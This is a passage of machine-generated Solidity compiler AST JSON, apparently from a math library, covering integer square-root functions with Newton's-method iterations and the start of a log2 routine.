1"},"value":"1"},"src":"22412:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3139,"nodeType":"ExpressionStatement","src":"22412:8:6"}]}},{"expression":{"id":3149,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3142,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"22855:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3148,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3145,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"33","id":3143,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22861:1:6","typeDescriptions":{"typeIdentifier":"t_rational_3_by_1","typeString":"int_const 3"},"value":"3"},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":3144,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"22865:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"22861:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3146,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"22860:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":3147,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22872:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"22860:13:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"22855:18:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3150,"nodeType":"ExpressionStatement","src":"22855:18:6"},{"expression":{"id":3160,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3151,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"24760:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3159,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3156,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3152,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"24766:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3155,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3153,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3014,"src":"24771:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":3154,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"24775:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"24771:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"24766:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3157,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"24765:13:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":3158,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"24782:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"24765:18:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"24760:23:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3161,"nodeType":"ExpressionStatement","src":"24760:23:6"},{"expression":{"id":3171,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3162,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"24869:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3170,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3167,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3163,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"24875:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3166,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3164,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3014,"src":"24880:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":3165,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"24884:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"24880:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"24875:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3168,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"24874:13:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":3169,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"24891:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"24874:18:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"24869:23:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3172,"nodeType":"ExpressionStatement","src":"24869:23:6"},{"expression":{"id":3182,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3173,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"24980:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3181,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3178,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3174,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"24986:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3177,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3175,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3014,"src":"24991:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":3176,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"24995:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"24991:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"24986:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3179,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"24985:13:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":3180,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"25002:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"24985:18:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"24980:23:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3183,"nodeType":"ExpressionStatement","src":"24980:23:6"},{"expression":{"id":3193,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3184,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25089:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3192,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3189,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3185,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25095:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3188,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3186,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3014,"src":"25100:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":3187,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25104:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25100:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25095:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3190,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"25094:13:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":3191,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"25111:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"25094:18:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25089:23:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3194,"nodeType":"ExpressionStatement","src":"25089:23:6"},{"expression":{"id":3204,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3195,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25199:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3203,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3200,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3196,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25205:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3199,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3197,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3014,"src":"25210:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":3198,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25214:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25210:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25205:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3201,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"25204:13:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":3202,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"25221:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"25204:18:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25199:23:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3205,"nodeType":"ExpressionStatement","src":"25199:23:6"},{"expression":{"id":3215,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3206,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25309:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3214,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3211,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3207,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25315:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3210,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3208,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3014,"src":"25320:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":3209,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25324:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25320:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25315:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3212,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"25314:13:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":3213,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"25331:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"25314:18:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25309:23:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3216,"nodeType":"ExpressionStatement","src":"25309:23:6"},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3226,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3217,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25698:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3224,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3220,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25719:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3223,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3221,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3014,"src":"25724:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":3222,"name":"xn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3031,"src":"25728:2:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25724:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25719:11:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3218,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"25703:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3219,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"25712:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"25703:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3225,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"25703:28:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"25698:33:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3018,"id":3227,"nodeType":"Return","src":"25691:40:6"}]}]},"documentation":{"id":3012,"nodeType":"StructuredDocumentation","src":"20270:292:6","text":" @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded\n towards zero.\n This method is based on Newton's method for computing square roots; the algorithm is restricted to only\n using integer operations."},"id":3230,"implemented":true,"kind":"function","modifiers":[],"name":"sqrt","nameLocation":"20576:4:6","nodeType":"FunctionDefinition","parameters":{"id":3015,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3014,"mutability":"mutable","name":"a","nameLocation":"20589:1:6","nodeType":"VariableDeclaration","scope":3230,"src":"20581:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3013,"name":"uint256","nodeType":"ElementaryTypeName","src":"20581:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"20580:11:6"},"returnParameters":{"id":3018,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3017,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3230,"src":"20615:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3016,"name":"uint256","nodeType":"ElementaryTypeName","src":"20615:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"20614:9:6"},"scope":3686,"src":"20567:5181:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3263,"nodeType":"Block","src":"25921:171:6","statements":[{"id":3262,"nodeType":"UncheckedBlock","src":"25931:155:6","statements":[{"assignments":[3242],"declarations":[{"constant":false,"id":3242,"mutability":"mutable","name":"result","nameLocation":"25963:6:6","nodeType":"VariableDeclaration","scope":3262,"src":"25955:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3241,"name":"uint256","nodeType":"ElementaryTypeName","src":"25955:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":3246,"initialValue":{"arguments":[{"id":3244,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3233,"src":"25977:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3243,"name":"sqrt","nodeType":"Identifier","overloadedDeclarations":[3230,3264],"referencedDeclaration":3230,"src":"25972:4:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":3245,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"25972:7:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"25955:24:6"},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3260,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3247,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3242,"src":"26000:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":3258,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":3251,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3236,"src":"26042:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}],"id":3250,"name":"unsignedRoundsUp","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3685,"src":"26025:16:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_enum$_Rounding_$2077_$returns$_t_bool_$","typeString":"function (enum Math.Rounding) pure returns (bool)"}},"id":3252,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26025:26:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3257,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3255,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3253,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3242,"src":"26055:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":3254,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3242,"src":"26064:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26055:15:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":3256,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3233,"src":"26073:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26055:19:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"26025:49:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3248,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"26009:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3249,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"26018:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"26009:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3259,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26009:66:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26000:75:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3240,"id":3261,"nodeType":"Return","src":"25993:82:6"}]}]},"documentation":{"id":3231,"nodeType":"StructuredDocumentation","src":"25754:86:6","text":" @dev Calculates sqrt(a), following the selected rounding direction."},"id":3264,"implemented":true,"kind":"function","modifiers":[],"name":"sqrt","nameLocation":"25854:4:6","nodeType":"FunctionDefinition","parameters":{"id":3237,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3233,"mutability":"mutable","name":"a","nameLocation":"25867:1:6","nodeType":"VariableDeclaration","scope":3264,"src":"25859:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3232,"name":"uint256","nodeType":"ElementaryTypeName","src":"25859:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":3236,"mutability":"mutable","name":"rounding","nameLocation":"25879:8:6","nodeType":"VariableDeclaration","scope":3264,"src":"25870:17:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"},"typeName":{"id":3235,"nodeType":"UserDefinedTypeName","pathNode":{"id":3234,"name":"Rounding","nameLocations":["25870:8:6"],"nodeType":"IdentifierPath","referencedDeclaration":2077,"src":"25870:8:6"},"referencedDeclaration":2077,"src":"25870:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"25858:30:6"},"returnParameters":{"id":3240,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3239,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3264,"src":"25912:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3238,"name":"uint256","nodeType":"ElementaryTypeName","src":"25912:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"25911:9:6"},"scope":3686,"src":"25845:247:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3354,"nodeType":"Block","src":"26281:2334:6","statements":[{"expression":{"id":3281,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3272,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"26363:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3280,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3277,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3275,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3267,"src":"26383:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30786666666666666666666666666666666666666666666666666666666666666666","id":3276,